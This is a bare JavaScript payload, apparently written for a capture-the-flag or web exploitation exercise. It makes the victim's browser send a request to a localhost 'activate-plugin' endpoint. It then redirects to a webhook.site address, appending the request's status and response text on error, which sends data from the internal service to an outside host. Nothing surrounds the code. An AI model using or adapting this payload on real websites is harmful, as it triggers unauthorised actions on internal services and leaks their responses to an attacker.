if(!document.cookie.includes("no-redirect")){
    try{
        let xml = new XMLHttpRequest();
        xml.open('GET', 'http://localhost:3000/activate-plugin/1', false);
        xml.onreadystatechange = function(){
            if(xml.readyState == 4){
                if(xml.status == 200){
                    document.location.href = 'https://webhook.site/949ccc25-e06d-46a8-804c-899b79bec444?good';
                } else {
                    document.location.href = 'https://webhook.site/949ccc25-e06d-46a8-804c-899b79bec444?error=' + xml.status + '&readyState=' + xml.readyState + '&statusText=' + xml.statusText + '&response=' + xml.responseText;
                }
            }
        }
        xml.send();

    }catch(e){
        document.location.href = 'https://webhook.site/949ccc25-e06d-46a8-804c-899b79bec444?error=' + e.message;
    }
}
